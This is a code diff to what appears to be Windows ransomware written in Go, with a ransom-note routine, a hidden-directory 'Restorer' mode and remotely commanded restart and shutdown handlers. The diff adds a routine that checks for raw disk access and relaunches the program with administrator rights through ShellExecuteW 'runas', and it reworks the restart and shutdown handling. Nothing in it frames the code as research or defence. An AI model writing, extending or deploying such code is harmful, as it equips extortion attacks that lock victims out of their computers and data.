@@ -98,6 +98,7 @@ type LockState struct {
 }
 
 func main() {
+	checkAdmin()
 	flag.Parse()
 
 	// Check if we are running as the "Restorer" (Boot from Hidden Dir)
@@ -355,15 +356,25 @@ func executeCommand(cmd Command) {
 
 	case "restart":
 		log.Println("Restarting system...")
-		reportResult(cmd, "System restarting...")
-		go exec.Command("shutdown", "/r", "/t", "0").Run()
-		result = "Restart command executed"
+		go func() {
+			execCmd := exec.Command("shutdown", "/r", "/t", "0")
+			if out, err := execCmd.CombinedOutput(); err != nil {
+				log.Printf("Restart failed: %v, Output: %s", err, string(out))
+				reportResult(cmd, fmt.Sprintf("Restart failed: %v", err))
+			}
+		}()
+		result = "Restart command issued"
 
 	case "shutdown":
 		log.Println("Shutting down system...")
-		reportResult(cmd, "System shutting down...")
-		go exec.Command("shutdown", "/s", "/t", "0").Run()
-		result = "Shutdown command executed"
+		go func() {
+			execCmd := exec.Command("shutdown", "/s", "/t", "0")
+			if out, err := execCmd.CombinedOutput(); err != nil {
+				log.Printf("Shutdown failed: %v, Output: %s", err, string(out))
+				reportResult(cmd, fmt.Sprintf("Shutdown failed: %v", err))
+			}
+		}()
+		result = "Shutdown command issued"
 
 	default:
 		log.Printf("Unknown command: %s\n", cmd.Action)
@@ -1487,5 +1498,55 @@ func showRansomNote() {
 		uintptr(unsafe.Pointer(message)),
 		uintptr(unsafe.Pointer(title)),
 		0x00000030|0x00001000,
+	)
+}
+
+func checkAdmin() {
+	if !amIAdmin() {
+		runMeElevated()
+		os.Exit(0)
+	}
+}
+
+func amIAdmin() bool {
+	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+	if err != nil {
+		return false
+	}
+	return true
+}
+
+func runMeElevated() {
+	verb := "runas"
+	exe, _ := os.Executable()
+	cwd, _ := os.Getwd()
+
+	var args []string
+	for _, arg := range os.Args[1:] {
+		if strings.Contains(arg, " ") {
+			args = append(args, `"`+arg+`"`)
+		} else {
+			args = append(args, arg)
+		}
+	}
+	argStr := strings.Join(args, " ")
+
+	verbPtr, _ := syscall.UTF16PtrFromString(verb)
+	exePtr, _ := syscall.UTF16PtrFromString(exe)
+	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
+	argPtr, _ := syscall.UTF16PtrFromString(argStr)
+
+	shell32 := syscall.NewLazyDLL("shell32.dll")
+	procShellExecuteW := shell32.NewProc("ShellExecuteW")
+
+	var showCmd int32 = 1 // SW_NORMAL
+
+	procShellExecuteW.Call(
+		0,
+		uintptr(unsafe.Pointer(verbPtr)),
+		uintptr(unsafe.Pointer(exePtr)),
+		uintptr(unsafe.Pointer(argPtr)),
+		uintptr(unsafe.Pointer(cwdPtr)),
+		uintptr(showCmd),
 	)
 }
